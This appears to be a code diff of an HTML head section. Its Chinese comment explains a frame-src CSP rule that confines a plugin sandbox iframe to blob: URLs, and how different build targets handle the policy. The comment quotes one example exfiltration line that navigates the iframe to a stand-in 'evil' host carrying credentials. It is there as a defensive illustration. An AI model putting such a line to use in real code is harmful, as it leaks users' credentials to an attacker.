@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <!--
-      只写 frame-src：把插件沙箱的 iframe 钉死在 blob: 上。
+      这里是兜底：只写 frame-src，把插件沙箱的 iframe 钉死在 blob: 上。
 
       `sandbox="allow-scripts"` 只挡跨文档访问，挡不住 iframe **自己**导航——
       插件在沙箱里跑一句 location.replace('https://evil/?c=' + credentials)
@@ -11,8 +11,11 @@
       frame-src 由父文档的 CSP 决定子框架能加载的地址，导航到 https:// 会被
       直接拦下。Tauri 那侧的同一条规则在 src-tauri/tauri.conf.json 的 csp 里。
 
-      刻意不加别的指令：script-src / style-src 一旦出现就会连坐现有的内联
-      脚本与 Radix 的内联样式（theme-preflash.js 是外部脚本，不受影响）。
+      分工：纯网页 / PWA / Docker 的 `vite build`（非 capacitor、非 Tauri）会在构建时
+      由 vite.csp.ts 把这条 content 换成完整策略。开发态（Vite 注入内联脚本）、
+      Capacitor（老安卓 WebView 上 Capacitor 会注入内联桥接脚本）、Tauri（自己管 CSP）
+      都保持这条只有 frame-src 的写法——script-src / style-src 一旦出现就会连坐那些内联脚本。
+      theme-preflash.js 是外部脚本，不受影响。
     -->
     <meta http-equiv="Content-Security-Policy" content="frame-src blob:" />
     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
